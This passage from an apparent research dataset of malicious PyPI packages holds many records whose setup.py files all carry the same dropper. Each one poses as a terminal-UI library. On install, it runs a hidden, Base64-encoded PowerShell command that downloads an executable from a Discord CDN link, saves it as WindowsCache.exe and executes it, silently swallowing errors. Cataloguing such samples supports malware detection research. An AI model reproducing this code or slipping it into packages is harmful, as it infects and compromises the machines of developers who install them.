  version = '2.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-pipcandylgtb-v8.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pipcandyLGTB',\n    packages = ['modlib'],\n    version = '5.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-replaceultragrand-v7.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-replaceultragrand',\n    packages = ['modlib'],\n    version = '3.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-visatoolstring-v2.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-visatoolstring',\n    packages = ['modlib'],\n    version = '4.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfpongencodeintel-v3.95",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpongencodeintel',\n    packages = ['modlib'],\n    version = '9.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tphttplgtbrandom-v4.68",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphttpLGTBrandom',\n    packages = ['modlib'],\n    version = '2.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpmaskpaypalping-v2.56",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskpaypalping',\n    packages = ['modlib'],\n    version = '8.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpsplitpushpush-v6.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitpushpush',\n    packages = ['modlib'],\n    version = '9.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfultrainfocraft-v5.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfultrainfocraft',\n    packages = ['modlib'],\n    version = '7.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfultraintelvisa-v8.88",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfultraintelvisa',\n    packages = ['modlib'],\n    version = '4.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfvirtualloadrand-v6.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvirtualloadrand',\n    packages = ['modlib'],\n    version = '7.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfvisarandompush-v8.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisarandompush',\n    packages = ['modlib'],\n    version = '2.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcvnvidiasuper-v9.58",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvnvidiasuper',\n    packages = ['modlib'],\n    version = '8.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcvverencode-v4.45",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvverencode',\n    packages = ['modlib'],\n    version = '1.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpgamelibhacked-v1.78",
